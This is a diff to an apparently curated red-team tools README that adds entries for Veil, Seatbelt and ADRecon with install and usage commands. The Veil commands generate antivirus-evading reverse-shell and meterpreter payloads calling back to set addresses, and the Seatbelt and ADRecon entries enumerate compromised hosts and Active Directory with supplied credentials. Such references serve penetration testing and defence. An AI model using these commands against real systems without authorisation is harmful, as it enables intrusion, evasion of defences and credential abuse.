@@ -101,10 +101,11 @@ Some of the tools may be specifically designed for red teaming, while others are
 </details>
 
 <details open>
-    <summary><b>Defense Evasion</b> $\textcolor{gray}{\text{1 tools}}$</summary>
+    <summary><b>Defense Evasion</b> $\textcolor{gray}{\text{2 tools}}$</summary>
     <ul>
         <ul>
             <li><b><a href="#invoke-obfuscation">Invoke-Obfuscation</a></b><i> Script obfuscator</i></li>
+	    <li><b><a href="#veil">Veil</a></b><i> Metasploit payload obfuscator</i></li>
         </ul>
     </ul>
 </details>
@@ -122,11 +123,13 @@ Some of the tools may be specifically designed for red teaming, while others are
 </details>
 
 <details open>
-    <summary><b>Discovery</b> $\textcolor{gray}{\text{2 tools}}$</summary>
+    <summary><b>Discovery</b> $\textcolor{gray}{\text{4 tools}}$</summary>
     <ul>
         <ul>
             <li><b><a href="#pcredz">PCredz</a></b><i> Credential discovery PCAP/live interface</i></li>
             <li><b><a href="#pingcastle">PingCastle</a></b><i> Active directory assessor</i></li>
+	    <li><b><a href="#seatbelt">Seatbelt</a></b><i> Local vulnerability scanner</i></li>
+	    <li><b><a href="#adrecon">ADRecon</a></b><i> Active directory recon</i></li>
         </ul>
     </ul>
 </details>
@@ -1149,6 +1152,51 @@ git clone https://github.com/danielbohannon/Invoke-Obfuscation.git
 
 ![image](https://user-images.githubusercontent.com/100603074/206557377-a522ab7a-5803-48b0-8f3e-d7d7b607e692.png)
 
+### [🔙](#tool-list)[Veil](https://github.com/Veil-Framework/Veil)
+
+Veil is a tool for generating metasploit payloads that bypass common anti-virus solutions.
+
+It can be used to generate obfuscated shellcode, see the official [veil framework blog](https://www.veil-framework.com/) for more info.
+
+**Install: (Kali)** 
+
+```bash
+apt -y install veil
+/usr/share/veil/config/setup.sh --force --silent
+```
+
+**Install: (Git)** 
+
+```bash
+sudo apt-get -y install git
+git clone https://github.com/Veil-Framework/Veil.git
+cd Veil/
+./config/setup.sh --force --silent
+```
+
+**Usage:** 
+
+```bash
+# List all payloads (–list-payloads) for the tool Ordnance (-t Ordnance)
+./Veil.py -t Ordnance --list-payloads
+
+# List all encoders (–list-encoders) for the tool Ordnance (-t Ordnance)
+./Veil.py -t Ordnance --list-encoders
+
+# Generate a reverse tcp payload which connects back to the ip 192.168.1.20 on port 1234
+./Veil.py -t Ordnance --ordnance-payload rev_tcp --ip 192.168.1.20 --port 1234
+
+# List all payloads (–list-payloads) for the tool Evasion (-t Evasion)
+./Veil.py -t Evasion --list-payloads
+
+# Generate shellcode using Evasion, payload number 41, reverse_tcp to 192.168.1.4 on port 8676, output file chris
+./Veil.py -t Evasion -p 41 --msfvenom windows/meterpreter/reverse_tcp --ip 192.168.1.4 --port 8676 -o chris
+```
+
+Veil creators wrote a nice [blog post](https://www.veil-framework.com/veil-command-line-usage/) explaining further ordnance and evasion command line usage.
+
+![image](https://user-images.githubusercontent.com/100603074/210136422-6b17671f-8868-4747-a7fe-e75d36b99e61.png)
+
 Credential Access
 ====================
 
@@ -1275,6 +1323,85 @@ https://github.com/vletoux/pingcastle/releases/download/2.11.0.1/PingCastle_2.11
 ```
 
 ![image](https://user-images.githubusercontent.com/100603074/191008405-39bab2dc-54ce-43d1-aed7-53956776a9ef.png)
+
+### [🔙](#tool-list)[Seatbelt](https://github.com/GhostPack/Seatbelt)
+
+Seatbelt is a useful tool for gathering detailed information about the security posture of a target Windows machine in order to identify potential vulnerabilities and attack vectors.
+
+It is designed to be run on a compromised victim machine to gather information about the current security configuration, including information about installed software, services, group policies, and other security-related settings
+
+**Install: (Compile)** 
+
+Seatbelt has been built against .NET 3.5 and 4.0 with C# 8.0 features and is compatible with [Visual Studio Community Edition](https://visualstudio.microsoft.com/downloads/).
+
+Open up the project .sln, choose "release", and build.
+
+**Usage:** 
+
+```bash
+# Run all checks and output to output.txt
+Seatbelt.exe -group=all -full > output.txt
+
+# Return 4624 logon events for the last 30 days
+Seatbelt.exe "LogonEvents 30"
+
+# Query the registry three levels deep, returning only keys/valueNames/values that match the regex .*defini.*
+Seatbelt.exe "reg \"HKLM\SOFTWARE\Microsoft\Windows Defender\" 3 .*defini.* true"
+
+# Run remote-focused checks against a remote system
+Seatbelt.exe -group=remote -computername=192.168.230.209 -username=THESHIRE\sam -password="yum \"po-ta-toes\""
+```
+
+Full command groups and parameters can be found [here](https://github.com/GhostPack/Seatbelt#command-groups).
+
+![image](https://user-images.githubusercontent.com/100603074/210137456-14eb3329-f29d-4ce1-a595-3466bd5a962f.png)
+
+*Image used from https://exord66.github.io/csharp-in-memory-assemblies*
+
+### [🔙](#tool-list)[ADRecon](https://github.com/sense-of-security/adrecon)
+
+Great tool for gathering information about a victim's Microsoft Active Directory (AD) environment, with support for Excel outputs.
+
+It can be run from any workstation that is connected to the environment, even hosts that are not domain members.
+
+[BlackHat USA 2018 SlideDeck](https://speakerdeck.com/prashant3535/adrecon-bh-usa-2018-arsenal-and-def-con-26-demo-labs-presentation)
+
+**Prerequisites** 
+
+- .NET Framework 3.0 or later (Windows 7 includes 3.0)
+- PowerShell 2.0 or later (Windows 7 includes 2.0)
+
+**Install: (Git)** 
+
+```bash
+git clone https://github.com/sense-of-security/ADRecon.git
+```
+
+**Install: (Download)** 
+
+You can download a zip archive of the [latest release](https://github.com/sense-of-security/ADRecon/archive/master.zip). 
+
+**Usage:** 
+
+```bash
+# To run ADRecon on a domain member host.
+PS C:\> .\ADRecon.ps1
+
+# To run ADRecon on a domain member host as a different user.
+PS C:\>.\ADRecon.ps1 -DomainController <IP or FQDN> -Credential <domain\username>
+
+# To run ADRecon on a non-member host using LDAP.
+PS C:\>.\ADRecon.ps1 -Protocol LDAP -DomainController <IP or FQDN> -Credential <domain\username>
+
+# To run ADRecon with specific modules on a non-member host with RSAT. (Default OutputType is STDOUT with -Collect parameter)
+PS C:\>.\ADRecon.ps1 -Protocol ADWS -DomainController <IP or FQDN> -Credential <domain\username> -Collect Domain, DomainControllers
+```
+
+Full usage and parameter information can be found [here](https://github.com/sense-of-security/adrecon#usage).
+
+![image](https://user-images.githubusercontent.com/100603074/210137064-2a0247b3-5d28-409a-904b-0fd9db87ef56.png)
+
+*Image used from https://vk9-sec.com/domain-enumeration-powerview-adrecon/*
 
 Lateral Movement
 ====================
